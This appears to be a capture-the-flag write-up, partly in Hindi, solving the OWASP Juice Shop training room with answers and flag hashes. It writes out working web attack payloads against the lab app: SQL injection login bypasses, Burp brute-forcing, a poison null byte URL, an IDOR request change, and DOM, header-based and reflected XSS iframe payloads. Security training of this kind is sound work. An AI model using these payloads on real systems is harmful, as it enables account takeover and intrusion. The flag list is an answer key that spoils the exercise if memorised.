# OWASP Juice Shop
This room uses the Juice Shop vulnerable web application to learn how to identify and exploit common web application vulnerabilities.
[PortSwigger Lab Solve](https://github.com/ricardojoserf/Portswigger-Labs/tree/main)
---
### Target IP http://10.49.154.245

## Task 1. Let's go on an adventure!
### Question #1: What's the Administrator's email address?
```
admin@juice-sh.op
```

### Question #2: What parameter is used for searching? 
- http://10.49.154.245/#/search?q=test
```
q
```
### Question #3: What show does Jim reference in his review? 
- Jim did a review on the Green Smoothie product. We can see that he mentions a replicator. 
- If we google "replicator" we will get the results indicating that it is from a TV show called Star Trek
- https://en.wikipedia.org/wiki/Replicator_(Star_Trek)
```
Star Trek
```

---
## Task 2. Inject the juice
### Question #1: Log into the administrator account!
- SQL Injection try -> ' or 1=1--
```
You successfully solved a challenge: Login Admin (Log in with the administrator's user account.)

690fa3247a99d651e0b26f947baf0b79b4f404a9 
```
### Question #2: Log into the Bender account!
- SQL Injection try -> bender@juice-sh.op' --
```
You successfully solved a challenge: Login Bender (Log in with Bender's user account.)

5ff5052e879e6fef64124e64c82c84ebc809c6c4 
```
---

## Task 3. Who broke my lock?! 
### Question #1: Bruteforce the Administrator account's password!
- BurpSuite ka Use karna he Intuder se brute force karna he 
- {"email":"admin@juice-sh.op","password":"123"}
- You can load the list from: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
```
You successfully solved a challenge: Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)

ff4aebffe31b0ffdea9bdd0207a16a3c01ac6c56
```

### Question #2: Reset Jim's password!
- Search karn ahe google par wikipedia par **Jim Star Trek**
- Wikipedia par Family me Brother name dekhana he jo ki he **Samuel** yhi security QUestion he ussse feel karke new password dalana he successfully change ho jayega 
```
You successfully solved a challenge: Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)

3c3e2d6ef99b733b947e92f8e2a9ed08bf57ea63 
```

---
## Task 4. AH! Don't look!
### Question #1: Access the Confidential Document!
- Is url direcory par jana he he ftp par bahut sari file dikhegi jo ki Confidentail Documents
- http://10.49.154.245/ftp/legal.md
```
You successfully solved a challenge: Confidential Document (Access a confidential document.)

8d2072c6b0a455608ca1a293dc0c9579883fc6a5
```

### Question #2: Log into MC SafeSearch's account!
- He notes that his password is "Mr. Noodles" but he has replaced some "vowels into zeros", meaning that he just replaced the o's into 0's.We now know the password to the mc.safesearch@juice-sh.op account is "Mr. N00dles"
```
You successfully solved a challenge: Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)

bb105418e73708ceccf1a7b2491f434b8f5230e4 
```

### Question #3: Download the Backup file!
- Ftp directory ke ander package.json.bak file ko downlaod karna he uske liye %2500.md last me lagana he jisse downlado ho jata he 
- http://10.49.154.245/ftp/package.json.bak%2500.md
```
You successfully solved a challenge: Poison Null Byte (Bypass a security control with a Poison Null Byte to access a file not meant for your eyes.)

cfdeea14e8f01b4952722fd0e4a77f1928593c9a  
```
---

## Task 5. Who's flying this thing?
### Question #1: Access the administration page!
- sabse pahle firefox me ctrl+shift+i se developer tool me jana he fir debugger me main treade ke ander IP ke ander main-es2015.js ko open karna he code ko read formate me karna he {} is icon ko dabakar fir search karna he admin type word to hind me **administration**
e milega 
- http://10.49.154.249/#/administration
```
You successfully solved a challenge: Admin Section (Access the administration section of the store.)
71aeb3b0bf01cc6e488f0207bb62f79b41454a87
```

### Question #2: View another user's shopping basket!
- Admin se login karna he uske bad kisi ek product ko Add to Basket karna he uske bad ise request ko Burp suite me capture karna he or repeater me leker change karna he sirf 1 ki jagah 2 ko
- GET /rest/basket/1 HTTP/1.1  **<Change to >** GET /rest/basket/2 HTTP/1.1
```
You successfully solved a challenge: View Basket (View another user's shopping basket.)

e6982b34b6734ceadd28e5019b251f929a80b815
```

### Question #3: Remove all 5-star reviews!
- Sabse pahle Admin se login karna he uske bad
- http://10.49.154.249/#/administration
- Administration wale par jane ke bad ek koi sa bhi Star Wala Feddback delete kar dena he to solve ho jayega hamara challenge
```
You successfully solved a challenge: Five-Star Feedback (Get rid of all 5-star customer feedback.)

78231b75c0b2180b7e964dcbb1ab3c3f58639f2e
```
---

## Task 6. Where did that come from?
### Question #1: Perform a DOM XSS!
- Search Box me Iframe wala XSS payload chalana he
- <iframe src="javascript:alert(`xss`)"> 

```
You successfully solved a challenge: DOM XSS (Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">.)

4a31a4fe0954199566e360a873802bf64d0d0a84
```

### Question #2: Perform a persistent XSS!
- isme Admin se login karna he uske bad burp suite me capture karna he Account > Privacy & Security > Last Login IP par jana he or ek new Header add karna he
- True-Client-IP: <iframe src="javascript:alert(`xss`)">
- is header ko Is request me add karnke send karna he
- GET /rest/saveLoginIp HTTP/1.1
```
You successfully solved a challenge: HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header.)

c37da14686b69a220fd9febd09bb9593e7d0539f
```

### Question #3: Perform a reflected XSS!
- Admin se Login karna he uske bad Account > Order & Payement > ORder History > Track Order
- Track order par click karne par parameter milega **?id= **
- ?id= Parameter ki value change karke umse XXS ka payload replace karke page ko refrece karna he 
- http://10.49.154.249/#/track-result?id=%3Ciframe%20src=%22javascript:alert(%60xss%60)%22%3E
```
You successfully solved a challenge: Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)

305021787d3e9cd9cebc057a021c2504550bb3b6
```
---

## Task 7. Exploration!

### Access the /#/score-board/ page

- http://10.49.154.245/#/score-board
```
You successfully solved a challenge: Score Board (Find the carefully hidden 'Score Board' page.)

2614339936e8282e2f820f023d4d998a1f95e02a 
```
---






